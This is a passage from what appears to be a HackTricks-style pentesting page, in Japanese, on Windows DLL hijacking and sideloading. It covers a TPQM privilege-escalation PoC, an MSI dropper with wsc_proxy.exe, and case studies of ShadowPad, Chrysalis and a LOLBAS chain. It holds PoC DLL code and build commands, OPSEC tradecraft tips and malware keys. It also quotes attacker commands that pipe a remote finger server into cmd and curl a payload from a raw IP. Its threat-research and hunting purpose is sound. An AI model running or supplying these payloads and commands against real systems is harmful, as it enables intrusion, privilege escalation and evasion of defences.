- **DLL Search Behavior**: 最初に working directory から `hostfxr.dll` のロードを試み、見つからない場合は "NAME NOT FOUND" をログに記録します。これは local directory search precedence を示しています。

### Exploit Implementation

attacker は同じ directory に malicious な `hostfxr.dll` stub を配置し、missing DLL を悪用して user context で code execution を実現できます。
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9:30に実行されるのを待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL が管理者のセッション内で medium integrity で実行されます。
4. 標準的な UAC bypass techniques を連鎖させ、medium integrity から SYSTEM privileges へ昇格します。

## ケーススタディ: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) 経由の DLL Side-Loading

Threat actors は、信頼された署名済みプロセス上で payloads を実行するため、MSI-based droppers と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

チェーン概要
- ユーザーが MSI をダウンロードします。GUI install 中に CustomAction（例: LaunchApplication または VBScript action）が silently 実行され、embedded resources から次の stage を再構築します。
- dropper は、正規の署名済み EXE と malicious DLL を同じ directory に書き込みます（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により working directory の wsc.dll が最初にロードされ、署名済み parent の下で attacker code が実行されます（ATT&CK T1574.001）。

MSI analysis（確認するポイント）
- CustomAction table:
- executables または VBScript を実行する entries を探します。疑わしい pattern の例: LaunchApplication が embedded file を background で実行する。
- Orca（Microsoft Orca.exe）で、CustomAction、InstallExecuteSequence、Binary tables を確認します。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される、複数の小さな fragments を探します。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 次の2つのファイルを同じフォルダーに配置します。
- wsc_proxy.exe: 正規の署名済みhost（Avast）。このプロセスは、ディレクトリから名前でwsc.dllをloadしようとします。
- wsc.dll: attackerのDLL。特定のexportが不要な場合は、DllMainだけで十分です。それ以外の場合は、proxy DLLをbuildし、payloadをDllMainで実行しながら、必要なexportを本物のlibraryにforwardします。
- 最小限のDLL payloadをbuildします。
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export 要件には、proxying framework（例: DLLirant/Spartacus）を使用して、payload も実行する forwarding DLL を生成します。

- この technique は、host binary による DLL name resolution に依存します。host が absolute path または safe loading flag（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijack に失敗する可能性があります。
- KnownDLLs、SxS、forwarded exports は優先順位に影響するため、host binary と export set の選定時に考慮する必要があります。

## Signed triads + encrypted payloads（ShadowPad case study）

Check Point は、Ink Dragon が **three-file triad** を使用して ShadowPad を展開し、legitimate software に紛れ込ませながら core payload を disk 上で encrypted のまま維持する方法を説明しています:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendors が悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable の名前を Windows binary に見えるように変更します（例: `conhost.exe`）が、Authenticode signature は有効なままです。
2. **Malicious loader DLL** – EXE の隣に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で drop されます。この DLL は通常、ScatterBrain framework で obfuscated された MFC binary であり、役割は encrypted blob の場所を特定し、decrypt して、ShadowPad を reflectively map することだけです。
3. **Encrypted payload blob** – 同じ directory 内に `<name>.tmp` として保存されることが多くあります。decrypted payload を memory-map した後、loader は TMP file を削除して forensic evidence を破棄します。

Tradecraft notes:

* Signed EXE の名前を変更し（PE header 内の元の `OriginalFileName` は維持）、Windows binary を装いながら vendor signature を保持できます。そのため、Ink Dragon の習慣にならい、実際には AMD/NVIDIA utility である `conhost.exe` 風の binary を drop します。
* executable は trusted なままなので、allowlisting controls の大半では malicious DLL をその隣に配置するだけで済みます。loader DLL の customisation に集中してください。signed parent は通常、そのまま実行できます。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、mapping 後に file を zero 化できるよう writable であることを想定しています。payload が load されるまで directory を writable に保ち、memory 上に展開された後は、OPSEC のため TMP file を安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

Operators は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の隣に置く malicious DLL だけにします:<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）:** Hidden PowerShell が `cmd.exe /c` を spawn し、Finger server から commands を取得して `cmd` に pipe します。

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 の text を取得し、`| cmd` が server response を実行します。これにより operators は second stage server を server-side で rotate できます。

- **Built-in download/extract:** benign extension の archive を download し、unpack した後、random な `%LocalAppData%` folder の下に sideload target と DLL を stage します。

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は progress を隠し、redirect を follow します。`tar -xf` は Windows built-in tar を使用します。

- **WMI/CIM launch:** WMI 経由で EXE を start するため、telemetry には CIM-created process として表示され、その間に同じ directory にある DLL が load されます。

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作します。payload（例: Remcos）は trusted name の下で実行されます。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を設定します。admin scripts 以外では珍しい組み合わせです。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近の Lotus Blossom intrusion では、trusted update chain を悪用して NSIS-packed dropper を deliver し、DLL sideload と完全な in-memory payloads を stage しました。<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe`（NSIS）は `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard `BluetoothService.exe`、malicious `log.dll`、encrypted blob `BluetoothService` を drop してから EXE を launch します。
- host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を call します。`LogInit` は blob を mmap-load します。`LogWrite` は custom LCG-based stream（constants **0x19660D** / **0x3C6EF35F**、key material は prior hash から derived）で decrypt し、buffer を plaintext shellcode で overwrite して temp を free し、shellcode に jump します。
- IAT を避けるため、loader は FNV-1a basis 0x811C9DC5 + prime 0x100019 を使用して export names を hashing し、その後 Murmur-style avalanche（**0x85EBCA6B**）を適用して salted target hashes と比較します。

Main shellcode（Chrysalis）
- PE-like main module を、key `gQ2JR&9;` による add/XOR/sub の反復処理で five passes にわたって decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を動的に load して import resolution を完了します。
- per-character bit-rotate/XOR transforms により runtime で DLL name strings を reconstruct し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load します。
- second resolver は **PEB → InMemoryOrderModuleList** を walk し、各 export table を 4-byte blocks 単位で Murmur-style mixing により parse します。hash が見つからない場合のみ `GetProcAddress` に fallback します。

Embedded configuration & C2
- Config は drop された `BluetoothService` file 内の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4-decrypt すると C2 URL と User-Agent が明らかになります。
- Beacons は dot-delimited host profile を構築し、tag `4Q` を prepend した後、key `vAuig34%^325hGV` で RC4-encrypt して HTTPS 経由で `HttpSendRequestA` に渡します。Responses は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によって dispatch されます。
- Execution mode は CLI args によって制御されます。args なし = `-i` を指す persistence（service/Run key）を install、`-i` = `-k` を付けて self を relaunch、`-k` = install を skip して payload を実行します。

Alternate loader observed
- 同じ intrusion では Tiny C Compiler も drop され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が実行され、`libtcc.dll` がその隣に置かれていました。attacker-supplied C source は shellcode を embedded し、PE を disk に書き込まずに compile して memory 上で実行しました。次のように replicate できます:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は実行時に `Wininet.dll` を import し、hardcoded URL から second-stage shellcode を取得することで、compiler の実行を装う柔軟な loader となっていた。

## Signed-host sideloading with export proxying + host thread parking

一部の DLL sideloading chain では、malicious DLL の load 後に crash するのを防ぎ、legitimate host が後続 stage を正常に load できるだけ長く稼働し続けるための **stability engineering** が追加される。<sup>[[11]](#references)</sup>

Observed pattern
- trusted EXE を malicious DLL と同じ場所に、`version.dll` のような想定される dependency name で配置する。
- malicious DLL は、想定されるすべての export を real system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ **proxy** する。これにより import resolution が成功し、host process は動作を継続できる。
- load 後、malicious DLL は **host entry point** に patch を適用し、main thread が終了する代わりに、または process を終了させる code path を実行する代わりに、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を実行する。具体的には、next-stage DLL の name または path を decrypt（RC4/XOR が一般的）し、その後 `LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を維持するが、後続 stage に十分な時間、host が稼働し続けることまでは保証しない。
- `Sleep(INFINITE)` で main thread を parking することは、loader が worker thread で decryption、staging、または network bootstrap を実行している間、signed process を resident に保つ単純な方法である。
- suspicious な `DllMain` だけを hunting していると、host entry point が patch され、secondary thread が開始された後に興味深い behavior が発生するこの pattern を見逃す可能性がある。

Minimal workflow
1. signed host EXE をコピーし、local directory から resolve される DLL を特定する。
2. 同じ functions を export し、それらを legitimate DLL に forwarding する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` 内で worker thread を作成する。
4. その thread から、host entry point または main thread start routine に patch を適用し、`Sleep` loop を実行させる。
5. next-stage DLL の name/config を decrypt し、`LoadLibrary` を呼び出すか、payload を manual-map する。

Defensive pivots
- `version.dll` または同様に一般的な libraries を、`System32` ではなく自身の application directory から load する signed processes。
- image load の直後に process entry point へ適用される memory patches。特に `Sleep`/`SleepEx` へ redirect される jumps/calls。
- proxy DLL によって作成され、decrypt された name の second DLL に対して直ちに `LoadLibrary` を呼び出す threads。
- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で、vendor executables の隣に配置された full-export proxy DLLs。

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore が Europe を標的とする新しい Malware を展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks と Windows Helpers が出会うとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT を配布する進化する Impersonation Campaigns の分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government を標的とする Threat Clusters の分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network と Stealthy Offensive Operation の内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom の toolkit の詳細分析](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens の 2026 Espionage Campaigns を追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 中の Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が Southeast Asian Governments と Critical Infrastructure を標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
